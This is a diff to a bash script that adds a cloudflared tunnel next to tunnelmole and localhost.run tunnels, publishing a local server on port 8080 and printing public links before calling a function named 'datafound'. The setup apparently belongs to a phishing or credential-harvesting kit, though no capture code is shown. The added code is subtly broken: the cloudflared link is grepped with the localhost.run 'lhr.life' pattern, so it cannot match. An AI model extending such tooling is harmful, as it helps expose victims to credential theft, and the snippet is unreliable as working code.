@@ -24,7 +24,9 @@ if ! hash tmole > /dev/null 2>&1; then
   apt install nodejs -y 
   npm -g install tunnelmole
 fi
-
+if ! hash cloudflared > /dev/null 2>&1; then
+  apt install cloudflared -y 
+fi 
 # Banner & Menu Don't change Author name
 main(){
 clear
@@ -363,14 +365,19 @@ hosting(){
   sleep 3
   printf "Starting localhost tunnel...\r"
   ssh -R 80:localhost:8080 nokey@localhost.run > .lhrlog 2> /dev/null &
-  sleep 10
+  sleep 10 
+  printf "Starting cloudflared tunnel...\r"
+  cloudflared tunnel -url localhost:8080 --logfile .cflog > /dev/null 2>&1 &
   link=$(grep -o 'https://[-0-9a-z]*\.tunnelmole.net' ".srvlog")
   lhlink=$(grep -o 'https://[-0-9a-z]*\.lhr.life' ".lhrlog")
+  cflink=$(grep -o 'https://[-0-9a-z]*\.lhr.life' ".cflog")
   rm -rf .lhrlog .srvlog
   echo -e "\e[32;1myour links are given bellow \e[34;1m\n"
   echo Public Link : $link
   echo ""
   echo Public Link : $lhlink
+  echo ""
+  echo Public Link : $cflink
   echo -e "\nLocalHost  : http://localhost:8080"
   datafound
 }
